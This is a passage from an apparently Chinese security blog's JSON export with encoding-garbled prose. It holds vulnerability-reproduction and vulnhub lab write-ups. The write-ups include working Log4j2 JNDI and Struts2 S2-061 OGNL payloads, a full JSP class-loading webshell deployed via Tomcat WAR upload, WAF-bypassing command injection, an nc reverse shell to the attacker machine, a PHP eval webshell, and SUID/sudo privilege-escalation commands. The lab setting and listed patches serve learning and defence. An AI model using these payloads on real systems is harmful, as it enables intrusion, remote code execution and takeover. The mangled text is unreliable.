ç›‘å¬\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131857057.png)\n\n\n","tags":["å‘½ä»¤æ‰§è¡Œ","fastjson"],"categories":["æ¼æ´å¤ç°"]},{"title":"log4j2æ¼æ´å¤ç°","url":"/2022/06/12/log4j2æ¼æ´å¤ç°/","content":"\n# æ¦‚è¿°\nCVE-2021-44228\nApache Log4j2 æ˜¯ä¸€æ¬¾å¼€æºçš„ Java æ—¥å¿—è®°å½•å·¥å…·ï¼Œå¤§é‡çš„ä¸šåŠ¡æ¡†æ¶éƒ½ä½¿ç”¨äº†è¯¥ç»„ä»¶ã€‚å¦‚ï¼šApache Struts2ã€Apache Solrã€Apache Druidã€Apache Flinkç­‰ã€‚æ­¤æ¬¡æ¼æ´æ˜¯ç”¨äº Log4j2 æä¾›çš„ lookup åŠŸèƒ½é€ æˆçš„ï¼Œè¯¥åŠŸèƒ½å…è®¸å¼€å‘è€…é€šè¿‡ä¸€äº›åè®®å»è¯»å–ç›¸åº”ç¯å¢ƒä¸­çš„é…ç½®ã€‚ä½†åœ¨å®ç°çš„è¿‡ç¨‹ä¸­ï¼Œå¹¶æœªå¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œä»è€Œé€ æˆæ¼æ´çš„å‘ç”Ÿã€‚\nåœ¨å…¶2.0åˆ°2.14.1ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€å¤„JNDIæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…åœ¨å¯ä»¥æ§åˆ¶æ—¥å¿—å†…å®¹çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¼ å…¥ç±»ä¼¼äº${jndi:ldap://evil.com/example}çš„lookupç”¨äºè¿›è¡ŒJNDIæ³¨å…¥ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚\n# å½±å“èŒƒå›´\nApache Log4j 2.x < 2.15.0-rc2\n\n# ç¯å¢ƒ\nç”¨çš„æ˜¯githubä¸Šçš„ä¸€ä¸ªdockerç¯å¢ƒ:log4j_vuln\n```bash\n1.1 æ‹‰å–æ¼æ´ç¯å¢ƒé•œåƒ\ndocker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln\n1.2 è¿è¡Œæ¼æ´ç¯å¢ƒå®¹å™¨\ndocker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln\n1.3 è¿›å…¥å®¹å™¨ä¸­\ndocker exec -it log4j_vuln_container /bin/bash\n1.4 å¯åŠ¨æ¼æ´ç¯å¢ƒ\n/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh\næ‰“å¼€http://xxx.xxx.xxx.xxx:8080/webstudy/hello-fengxuan\nå‡ºç°ä»¥ä¸‹é¡µé¢ï¼Œè¯´æ˜æ­å»ºæˆåŠŸã€‚\n```\n# Exploit\n\n## è®¿é—®\nè®¿é—®url\n![](https://raw.githubusercontent.com/chencicici/images/main/202206122023707.png)\n\n## è·å–ä¸´æ—¶åŸŸå\nè®¿é—® http://dnslog.cn/\n![](https://raw.githubusercontent.com/chencicici/images/main/202206121717449.png)\n\n## dnslogæ‰§è¡Œä»£ç \næ„é€ payload\n```\nc=${jndi:ldap://log4j2.xxxxxx.dnslog.cn}\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206122026561.png)\n\næŸ¥çœ‹dnså¹³å°å·²ç»æ‰§è¡ŒæˆåŠŸ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206122026083.png)\n\n## å‘½ä»¤æ‰§è¡Œ\nåœ¨æœ¬åœ°å…ˆè¦ç”ŸæˆJNDIé“¾æ¥å¹¶å¯åŠ¨åç«¯ç›¸å…³æœåŠ¡ï¼Œæ³¨æ„é˜²ç«å¢™å¼€å¯ç›¸å…³ç«¯å£ï¼Œç”¨çš„æ˜¯[JNDIExploit-1.2-SNAPSHOT.jar](https://download.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip)\n```bash\njava -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.20.146.195 -l 9999 -p 80\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206122035772.png)\n\næ„é€ payload\n```\ncmd: whoami\n\nc=${jndi:ldap://10.20.146.195:9999/TomcatBypass/TomcatEcho}\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206122055177.png)\n\n# ä¿®å¤æ–¹æ¡ˆ\nè¡¥ä¸é“¾æ¥:\n[log4j-2.15.0-rc2](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2)\n\n1. æ·»åŠ jvmå¯åŠ¨å‚æ•°-Dlog4j2.formatMsgNoLookups=trueï¼›\n\n2. åœ¨åº”ç”¨classpathä¸‹æ·»åŠ log4j2.component.propertiesé…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºlog4j2.formatMsgNoLookups=trueï¼›\n\n3. JDKä½¿ç”¨11.0.1ã€8u191ã€7u201ã€6u211åŠä»¥ä¸Šçš„é«˜ç‰ˆæœ¬ã€‚","tags":["å‘½ä»¤æ‰§è¡Œ","log4j2"],"categories":["æ¼æ´å¤ç°"]},{"title":"Struts2 S2-061æ¼æ´å¤ç°","url":"/2022/06/11/Struts2S2-061æ¼æ´å¤ç°/","content":"# æ¦‚è¿°\nApache Strutsäº2020å¹´12æœˆ08æ—¥æŠ«éœ² S2-061 Struts è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2020-17530)\nStruts2 ä¼šå¯¹æŸäº›æ ‡ç­¾å±æ€§(æ¯”å¦‚ `id`ï¼Œå…¶ä»–å±æ€§æœ‰å¾…å¯»æ‰¾) çš„å±æ€§å€¼è¿›è¡ŒäºŒæ¬¡è¡¨è¾¾å¼è§£æï¼Œå› æ­¤å½“è¿™äº›æ ‡ç­¾å±æ€§ä¸­ä½¿ç”¨äº† `%{x}` ä¸” `x` çš„å€¼ç”¨æˆ·å¯æ§æ—¶ï¼Œç”¨æˆ·å†ä¼ å…¥ä¸€ä¸ª `%{payload}` å³å¯é€ æˆOGNLè¡¨è¾¾å¼æ‰§è¡Œã€‚S2-061æ˜¯å¯¹S2-059æ²™ç›’è¿›è¡Œçš„ç»•è¿‡ã€‚\n\nå½±å“èŒƒå›´:Apache Struts 2.0.0-2.5.25\n\n# ç¯å¢ƒ\nvulhubé¡¹ç›®åœ°å€ https://vulhub.org/#/environments/struts2/s2-061/\n\n# Exploit\n\n## pocæ£€æµ‹\nä½¿ç”¨pocæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨,éœ€è¦ä½¿ç”¨urlç¼–ç \n```\n?id=%25%7b+%27test%27+%2b+(11+%2b+11).toString()%7d\n```\n\nå®¡æŸ¥å…ƒç´ çœ‹åˆ°å›æ˜¾\n![](https://raw.githubusercontent.com/chencicici/images/main/202206121321542.png)\n\n## expåˆ©ç”¨\nå‘é€ä¸‹é¢æ•°æ®åŒ…\n```\nPOST /index.action HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Length: 831\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Disposition: form-data; name=\"id\"\n\n%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"whoami\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206121340388.png)\n\n","tags":["Struts2","å‘½ä»¤æ‰§è¡Œ"],"categories":["æ¼æ´å¤ç°"]},{"title":"Tomcatå¼±å£ä»¤åå°getshllå¤ç°","url":"/2022/06/10/Tomcatå¼±å£ä»¤åå°getshll/","content":"# ç¯å¢ƒ\nvulhub https://vulhub.org/#/environments/tomcat/tomcat8/\n\n# Exploit\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206101540258.png)\n\nå¼±å¯†ç ç™»å½•å\n\nå°†shell.jspæ‰“åŒ…æˆshell.zipï¼Œåœ¨æ”¹åç¼€ä¸ºshell.warä¸Šä¼ \n\nå¯†ç passwd\n```jsp\n<%!\n    class U extends ClassLoader {\n        U(ClassLoader c) {\n            super(c);\n        }\n        public Class g(byte[] b) {\n            return super.defineClass(b, 0, b.length);\n        }\n    }\n \n    public byte[] base64Decode(String str) throws Exception {\n        try {\n            Class clazz = Class.forName(\"sun.misc.BASE64Decoder\");\n            return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str);\n        } catch (Exception e) {\n            Class clazz = Class.forName(\"java.util.Base64\");\n            Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);\n            return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str);\n        }\n    }\n%>\n<%\n    String cls = request.getParameter(\"passwd\");\n    if (cls != null) {\n        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);\n    }\n%>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206101552494.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206101558421.png)\n\nè¿æ¥url\nhttp://localhost:8080/shell/shell.jsp\n![](https://raw.githubusercontent.com/chencicici/images/main/202206101555698.png)\n\n\n","tags":["Tomcat","å¼±å£ä»¤"],"categories":["æ¼æ´å¤ç°"]},{"title":"çº¢é˜Ÿæ¸—é€é¡¹ç›®vulnhub-MinUv1æ‰“é¶","url":"/2022/06/09/çº¢é˜Ÿæ¸—é€é¡¹ç›®vulnhub-MinUv1æ‰“é¶/","content":"\n# ç¯å¢ƒ\né¶æœºé¡¹ç›®åœ°å€https://www.vulnhub.com/entry/minu-1,235/\nä½¿ç”¨vmå¯¼å…¥é¶æœºéœ€è¦å…³æ‰ç½‘å¡2,å†é‡æ–°dhclinent\n\né¶æœº:172.16.17.144\n\næ”»å‡»æœºkali:172.16.17.140\n\n\n# ç›®æ ‡\næ‹¿åˆ°rootä¸‹çš„flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091226745.png)\n\n\n# ä¿¡æ¯æ”¶é›†\n\n## nmapæ”¶é›†\n```bash\nnmap -A -sV -sS -T5 172.16.17.144\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091107061.png)\n\nä¸­é—´ä»¶ä¸ºApache2.4.27,æœåŠ¡å™¨ä¸ºubuntu\n\n## ç›®å½•çˆ†ç ´\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091108873.png)\næ‰“å¼€å‘ç°åªæœ‰ä¸€ä¸ªapacheé¦–é¡µ,ä¸¢åˆ°dirbçˆ†ç ´\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091110331.png)\nå‡ ä¹éƒ½æ˜¯403,åº”è¯¥æ˜¯æœ‰é™åˆ¶,è¦ä¹ˆæ˜¯è„šæœ¬è¦ä¹ˆæ˜¯waf,ç»§ç»­åŠ å¤§åŠ›åº¦çˆ†ç ´\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091133000.png)\n\nå‘ç°ä¸€ä¸ªtest.php\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091137577.png)\n\n\n# Exploit\n\n## å‘½ä»¤æ‰§è¡Œ\nå‘ç°å…³é”®å­—,ä¸€èˆ¬file=xxå¯èƒ½ä¼šå­˜åœ¨å‘½ä»¤æ‰§è¡Œ,æ–‡ä»¶åŒ…å«,æ–‡ä»¶ä¸‹è½½,æ–‡ä»¶è¯»å–ç­‰æ¼æ´\nå°è¯•è¯»å–æ–‡ä»¶403,åº”è¯¥æ˜¯å­˜åœ¨waf\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091224040.png)\n\n- å°è¯•å‘½ä»¤æ‰§è¡Œ,æˆåŠŸå›æ˜¾\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091226943.png)\nls,catç­‰å‘½ä»¤è¢«æ‹¦æˆª\n  \n  \n## wafç»•è¿‡\næ‰‹å·¥fuzzå‘ç°ä½¿ç”¨?æˆ–è€…*å¯ä»¥ç»•è¿‡waf,åŒæ ·ä¼šè¢«è§£æ\n```bash\nåŸpayload  /bin/cat /ect/passwd\nç»•è¿‡ /b?n/c?t /e?t/pa??wd\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091257717.png)\n\n## å°è¯•å†™é©¬å¤±è´¥\n```bash\nåŸpayload\n/bin/echo echo  '<?php @eval($_POST[\"shell\"]);?>'>>shell.php|/usr/bin/base64 -d|/bin/bash\n\nbase64ç¼–ç è¿‡å\n|/b?n/e?ho ZWNobyAgJzw/cGhwIEBldmFsKCRfUE9TVFsic2hlbGwiXSk7Pz4nPj5zaGVsbC5waHA=|/u?r/b?n/b?se64 -d|/b?n/b?sh\n```\n\nåœ¨æœ¬åœ°kaliæµ‹è¯•æˆåŠŸ,ä½†æ˜¯åœ¨é¶æœºä¸Šå¤±è´¥,ä¸çŸ¥é“åŸå› å¯èƒ½è¢«wafæ‹¦æˆªäº†\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091354331.png)\n\nå†™é©¬ä¸è¡Œé‚£å°±è¯•è¯•ncåå¼¹\n\n## åå¼¹shell\næœ¬åœ°ç›‘å¬5555ç«¯å£\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091418598.png)\n\n```bash\nåŸpayload\n/bin/echo \"nc -e /bin/sh 172.16.17.140 5555\" | /usr/bin/base64 -d| /bin/sh \n\nbase64ç¼–ç è¿‡å\n/b?n/e??o bmMgLWUgL2Jpbi9zaCAxNzIuMTYuMTcuMTQwIDU1NTUg|/?s?/b??/b??e64 -d|/b?n/sh \n```\néœ€è¦æ³¨æ„çš„æ˜¯,base64ç¼–ç è¿‡åä¼šå‡ºç°=æˆ–è€…==,ä¼šè¢«wafæ‹¦æˆª,å¯ä»¥æœ«å°¾æ·»åŠ ç©ºæ ¼\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091418922.png)\n\nç”¨pythonåå¼¹ä¸€ä¸ªäº¤äº’å¼shell\n```bash\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")' \n```\nè¿™é‡Œè¦æ³¨æ„çš„æ˜¯,è¦æ ¹æ®é¶æœºpythonå˜é‡æ¥,å¯èƒ½æ˜¯pythonå¯èƒ½æ˜¯python3\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091421850.png)\næ‰¾åˆ°çº¿ç´¢\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091424098.png)\n\n## JWT\nä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ç¼–ç æˆ–è€…åŠ å¯†,æ²¡è§£å‡ºæ¥,ä»”ç»†çœ‹å‘ç°,æ˜¯ä»¥`.`åˆ†å‰²çš„ä¸‰æ®µå­—ç¬¦ä¸²,æ ‡å‡†çš„JWT\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg\n```\nJWTåœ¨çº¿è§£æ https://jwt.io/#debugger-io\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091431918.png)\n\nå‰é¢ä¸¤éƒ¨åˆ†æ˜¯base64ç¼–ç ,æœ€åä¸€éƒ¨åˆ†éœ€è¦ç§˜é’¥\n\n- ä½¿ç”¨å·¥å…·çˆ†ç ´\né¡¹ç›®åœ°å€ https://github.com/brendan-rius/c-jwt-cracker\n```bash\ncd c-jwt-cracker-master \n                                                                                                                                                                                                  \napt-get install libssl-dev\n\nmake\n\n./jwtcrack key\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091452825.png)\n\nç­‰å¾…å‡ åˆ†é’Ÿçˆ†å‡ºå¯†ç ,æ ¹æ®æœ€å¼€å§‹çš„æç¤ºåº”è¯¥æ˜¯rootå¯†ç \n\n## getflag\nç™»å½•root\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091456953.png)","tags":["vulnhub","çº¢é˜Ÿ"],"categories":["æ‰“é¶"]},{"title":"vulnhub-dc2æ‰“é¶","url":"/2022/06/07/vulnhub-dc2æ‰“é¶/","content":"# ç¯å¢ƒ\nvulnhubç¯å¢ƒ,é¡¹ç›®åœ°å€https://www.vulnhub.com/entry/dc-2,311/\né¶æœº:172.16.17.143\næ”»å‡»æœºkali:172.16.17.140\n\n\n# ç›®æ ‡\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071953622.png)\n\n# ä¿¡æ¯æ”¶é›†\næ‰¾åˆ°é¶æœºip\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071939781.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072051340.png)\n\næ‰“å¼€è·³è½¬dc-2/,502\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071940839.png)\n\næŠ“åŒ…å‘ç°301æ°¸ä¹…è·³è½¬ä¸€ä¸ªé¡µé¢\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071952711.png)\n\næ·»åŠ ä¸€ä¸ªè§£æ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072000538.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072000379.png)\næ‹¿åˆ°ç¬¬ä¸€ä¸ªflag,æç¤ºæˆ‘ä»¬ä½¿ç”¨cewlæ¥ç”Ÿæˆå¯†ç \n\n# çˆ†ç ´\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072012702.png)\ncewlä½¿ç”¨ https://www.freebuf.com/articles/network/190128.html\n\nä½¿ç”¨cewlç”Ÿæˆå­—å…¸\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072018340.png)\n\néœ€è¦æ‰«å‡ºç™»å½•ç‚¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072035043.png)\nç»å…¸wordpress\n\næå‡ºwpscan,æšä¸¾ç”¨æˆ·\n```bash\nwpscan --url  http://dc-2 -e u\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072041502.png)\n\nå°†ç”¨æˆ·åå†™å…¥txt,å¼€å§‹çˆ†ç ´\n```bash\nwpscan --url  http://dc-2 -U name.txt -P pwd.txt\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072044253.png)\n\nç™»å½•jerryè´¦å·å‘ç°flag2\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072047333.png)\nflagæç¤º,å¦‚æœwpæ²¡æ³•åˆ©ç”¨å°±æ‰¾åˆ«çš„æ–¹æ³•,æƒ³åˆ°åˆšåˆšä¿¡æ¯æ”¶é›†è¿˜æœ‰ssh,ç”¨è¿™ä¸¤ä¸ªè´¦å·å»è¯•è¯•\n\nmsfçˆ†ç ´ssh\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072057740.png)\næœ€åä½¿ç”¨tomç”¨æˆ·æˆåŠŸç™»å½•\n\n\n# ææƒ\nå°è¯•ä¹‹åå‘ç°æƒé™å¾ˆä½,ä½¿ç”¨viæŸ¥çœ‹å†…å®¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072100660.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072059691.png)\nå¾—åˆ°æç¤º,å°è¯•su,å‘ç°æ²¡æœ‰è¿™ä¸ªå‘½ä»¤,æŸ¥çœ‹ä¸€ä¸‹å½“å‰ç”¨æˆ·çš„ç¯å¢ƒå˜é‡\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072103628.png)\n\nä½¿ç”¨viå°è¯•ç»•è¿‡,å¾—åˆ°ä¸€ä¸ªæ­£å¸¸ç¯å¢ƒå˜é‡\n```bash\nvi a.txt\n\n#è®¾ç½®shellå˜é‡\n:shell = /bin/bash\n\n#å¯åŠ¨shell\n:shell\n\n# å¯¼å…¥ç¯å¢ƒå˜é‡\nexport PATH=$PATH:/bin\n\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072116628.png)\n\nç™»å½•jerry,ä½¿ç”¨åˆšåˆšçˆ†ç ´å‡ºçš„å¯†ç ,å¾—åˆ°flag4.txt,æ²¡æœ‰æç¤º\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072120697.png)\n\næŸ¥çœ‹å†å²å‘½ä»¤,å‘ç°æœ‰ä½¿ç”¨sudo git,ä¹Ÿå°±æ˜¯è¯´gitæ˜¯æœ‰rootæƒé™çš„\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072129726.png)\n\ngitææƒ\n```bash\nsudo git help add\næœ«å°¾è¾“å…¥!/bin/bash\n\næˆ–è€…\n\nsudo git help config\næœ«å°¾è¾“å…¥\n!'sh'\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072127120.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072128530.png)\n\n","tags":["vulnhub"],"categories":["æ‰“é¶"]},{"title":"vulbhub-dc1æ‰“é¶","url":"/2022/06/07/vulnhub-dc1æ‰“é¶/","content":"# ç¯å¢ƒ\nvulnhubé¶åœº,é¡¹ç›®åœ°å€:https://www.vulnhub.com/entry/dc-1,292/\né¶æœº:172.16.17.142\næ”»å‡»æœº:172.16.17.140\nç½‘ç»œæ¨¡å¼:net\n\n\n# ç›®æ ‡\næ‰¾åˆ°5ä¸ªflag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071210943.png)\n\n\n# ä¿¡æ¯æ”¶é›†\n- nmapæ‰«ææ‰¾ç›®æ ‡ip\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071206991.png)\n  \n- è®¿é—®web\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071208399.png)\n  æ”¶é›†åˆ°webæŒ‡çº¹,å’ŒcmsæŒ‡çº¹\n  \n# expåˆ©ç”¨\ngoogleæ‰¾åˆ°cmsæœ‰nday(cve-2018-7600),è¿›kaliæ‰¾expæ‰“\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202206071212266.png)\n  è¿”å¼¹ä¸€ä¸ªmeterpreter shell,ä½†æ˜¯æƒé™å¾ˆä½\n\n\n# æ‰¾flag\n- ç¬¬ä¸€ä¸ªflag\nç”¨pythonåå¼¹ä¸€ä¸ªäº¤äº’å¼shell\n\n```python\npython -c 'import pty;pty.spawn(\"/bin/sh\")'\npython â€c \"import pty;pty.spawn('/bin/bash')\"\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071217200.png)\n\næ‹¿åˆ°æç¤ºä¿¡æ¯ (æ¯ä¸ªå¥½çš„ CMS éƒ½éœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶â€”â€”ä½ ä¹Ÿä¸€æ ·ã€‚)\nç™¾åº¦æ‰¾é…ç½®æ–‡ä»¶è·¯å¾„,å†™ä¸€ä¸ªä¸€å¥è¯ä¸Šå»ç”¨èšå‰‘è¿,æ–¹ä¾¿ä¸€ç‚¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071240945.png)\n\nåœ¨æ­¤é…ç½®æ–‡ä»¶ä¸‹æ‰¾åˆ°mysqlè¿æ¥è´¦å·å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206071242424.png)\n\nè¦æ³¨æ„çš„æ˜¯,è¿™é‡Œçš„mysqlä¸å‡ºç½‘,åªèƒ½é€šè¿‡msfåå¼¹çš„shellå»è¿æ¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071252501.png)\n\næ‹¿åˆ°ç½‘ç«™åå°è´¦å·å¯†ç ,ä½†æ˜¯è§£å¯†ä¸å‡º\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071303091.png)\n\nç»§ç»­å¾€ä¸‹ç¿»æ•°æ®åº“\n\n- flag3çš„çº¿ç´¢\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071257889.png)\n\nåˆ°æ­¤ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†flag3åˆ°åº•åœ¨å“ªé‡Œäº†(uidä¸º1çš„ç”¨æˆ·æ˜¯ä¸å—Drupalæƒé™ç®¡åˆ¶çš„ï¼Œå…·æœ‰æœ€é«˜æƒé™ã€‚)ç°åœ¨æˆ‘ä»¬æœ‰ä¸¤ä¸ªæ€è·¯ï¼š\n1. é‡ç½®ç®¡ç†å‘˜å¯†ç \nå¯èƒ½æ˜¯ç¯å¢ƒåŸå› ,æˆ‘åœ¨åŠ å¯†å¯†ç çš„æ—¶å€™æŠ¥é”™\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071311553.png)\n   ç½‘ä¸Šæ‰¾äº†ä¸€ä¸ªåŠ å¯†å¥½çš„\n   ```\n    æ˜æ–‡ï¼špassword\n    å¯†æ–‡ï¼š$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4\n    ```\n   å†™å…¥è¡¨ä¸­æ›¿æ¢åŸæ¥çš„å¯†ç \n    ![](https://raw.githubusercontent.com/chencicici/images/main/202206071315494.png)\n   ```mysql\n   update drupaldb.users set pass=\"$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4\" where uid=1;  \n   ```\n   ç™»å½•\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202206071317471.png)\n   æ‰¾åˆ°flag3å¾—åˆ°æç¤º\n   ![](https://raw.githubusercontent.com/chencicici/images/main/202206071319974.png)\n   (ç‰¹æ®Šçš„PERMSå°†å¸®åŠ©æ‚¨æ‰¾åˆ°passwdï¼Œä½†æ‚¨éœ€è¦æ‰§è¡Œè¯¥å‘½ä»¤æ¥ç¡®å®šå¦‚ä½•è·å–é˜´å½±ä¸­çš„å†…å®¹ã€‚)\n    \n\n2. åˆ©ç”¨expæ·»åŠ ç”¨æˆ·\n   \n    é¦–å…ˆè¦æŸ¥çœ‹cmså…·ä½“ç‰ˆæœ¬\n   ![](https://raw.githubusercontent.com/chencicici/images/main/202206071327767.png)\n   \n    ä½¿ç”¨searchsploitæ‰¾exp\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202206071328915.png)\n    \n    éœ€è¦ä½¿ç”¨python2å»è¿è¡Œ,ä¹‹åä¼šåˆ›å»ºä¸€ä¸ªtestçš„ç”¨æˆ·\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202206071335890.png)\n   ![](https://raw.githubusercontent.com/chencicici/images/main/202206071336865.png)\n   \n\n# ææƒ\næ ¹æ®flag3çš„æç¤º,å»å¯»æ‰¾çº¿ç´¢\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071341447.png)\nå‘ç°flag4 åœ¨homeç›®å½•ä¸‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071342274.png)\næ‹¿åˆ°flag4çš„æç¤º\n(æ˜¯å¦å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•åœ¨rootç›®å½•ä¸‹æ‰¾åˆ°æœ€ç»ˆflag)\n\næ ¹æ®æç¤º,æƒ³åˆ°ä½¿ç”¨suidææƒ,æŸ¥è¯¢rootæƒé™çš„å‘½ä»¤\n```bash\nfind / -user root -perm -4000\nfind / -user root -perm -4000 -print 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\nfind / -user root -perm -4000 -exec ls -ldb {} ;\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071349039.png)\n\nå¯ä»¥çœ‹åˆ°findæœ¬èº«å°±æ˜¯rootæƒé™\n\nä½¿ç”¨findææƒ,è¦æ³¨æ„çš„æ˜¯-nameåçš„æ–‡ä»¶å¿…é¡»å­˜åœ¨\n```bash\nfind ./ -name flag4.txt -exec '/bin/sh' \\;\n\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071355907.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071357520.png)\n","tags":["vulnhub","drupal7","ææƒ"],"categories":["æ‰“é¶"]},{"title":"Weblogic WLS CoreComponentsååºåˆ—åŒ–æ¼æ´å¤ç°","url":"/2022/06/04/WeblogicWLSCoreComponentsååºåˆ—åŒ–æ¼æ´å¤ç°/","content":"# æ¼æ´è§£æ\nWeblogic WLS Core Components ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-2628ï¼‰\nOracle 2018å¹´4æœˆè¡¥ä¸ä¸­ï¼Œä¿®å¤äº†Weblogic Server WLS Core Componentsä¸­å‡ºç°çš„ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2018-2628ï¼‰ï¼Œè¯¥æ¼æ´é€šè¿‡t3åè®®è§¦å‘ï¼Œå¯å¯¼è‡´æœªæˆæƒçš„ç”¨æˆ·åœ¨è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\n\n# ç¯å¢ƒ\nvulhubç¯å¢ƒ\n```bash\ncd CVE-2018-2628  \ndocker-compose up 